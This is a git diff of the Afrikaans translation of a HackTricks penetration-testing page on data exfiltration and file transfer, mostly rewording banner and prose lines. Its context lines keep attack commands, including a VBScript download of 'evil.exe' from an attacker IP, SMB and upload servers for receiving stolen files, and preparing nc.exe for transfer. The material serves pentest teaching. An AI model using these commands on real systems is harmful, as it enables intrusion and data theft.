@@ -1,23 +1,23 @@
 # Exfiltration
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Ondersteun HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
 ## Gewoonlik gewhitelist domeine om inligting te exfiltreer
 
-Check [https://lots-project.com/](https://lots-project.com/) om gewoonlik gewhitelist domeine te vind wat misbruik kan word
+Kyk [https://lots-project.com/](https://lots-project.com/) om gewoonlik gewhitelist domeine te vind wat misbruik kan word
 
 ## Copy\&Paste Base64
 
@@ -59,7 +59,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 * [**SimpleHttpServer wat GET en POSTs (ook koptekste) druk**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-* Python module [uploadserver](https://pypi.org/project/uploadserver/):
+* Python-module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -163,7 +163,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Of skep 'n smb deel **met samba**:
+Of skep 'n smb deel **met behulp van samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -309,7 +309,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Die `debug.exe` program stel nie net in staat om binêre te inspekteer nie, maar het ook die **vermoë om hulle vanaf hex te herbou**. Dit beteken dat deur 'n hex van 'n binêre te verskaf, kan `debug.exe` die binêre lêer genereer. Dit is egter belangrik om te noem dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte te monteer**.
+Die `debug.exe` program stel nie net in staat om binêre te inspekteer nie, maar het ook die **vermoë om hulle uit hex te herbou**. Dit beteken dat deur 'n hex van 'n binêre te verskaf, kan `debug.exe` die binêre lêer genereer. Dit is egter belangrik om te noem dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte te monteer**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
